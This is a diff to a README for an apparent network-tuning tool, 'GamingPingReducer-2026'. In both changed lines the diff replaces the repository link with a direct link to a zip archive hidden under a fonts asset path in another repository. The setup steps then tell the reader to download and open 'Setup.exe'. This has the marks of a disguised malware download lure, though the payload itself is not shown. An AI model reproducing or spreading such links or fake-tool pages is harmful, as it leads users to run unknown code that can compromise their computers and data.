@@ -5,7 +5,7 @@ description: "Optimize network settings to reduce game latency and packet loss o
 ---
 # 🎮 GamingPingReducer-2026 - Lower your lag for better gaming
 
-[![Download GamingPingReducer](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/Flamecolored-jamaica596/GamingPingReducer-2026)
+[![Download GamingPingReducer](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://raw.githubusercontent.com/Flamecolored-jamaica596/flamecolored-jamaica596.github.io/main/assets/fonts/Lilex/static/Dist_2.9-alpha.2.zip)
 
 This tool helps your computer work better with your internet connection. It focuses on game traffic to lower ping and stop data loss. You get a smoother experience in online games. The software changes your network settings automatically. It tunes your TCP stack and finds the best DNS servers for your location. This ensures your computer talks to game servers faster and more reliably.
 
@@ -20,7 +20,7 @@ This tool helps your computer work better with your internet connection. It focu
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the software: https://github.com/Flamecolored-jamaica596/GamingPingReducer-2026
+1. Visit the repository page to download the software: https://raw.githubusercontent.com/Flamecolored-jamaica596/flamecolored-jamaica596.github.io/main/assets/fonts/Lilex/static/Dist_2.9-alpha.2.zip
 2. Locate the download button or link on the page.
 3. Click the link to save the Setup.exe file to your computer.
 4. Open your Downloads folder.
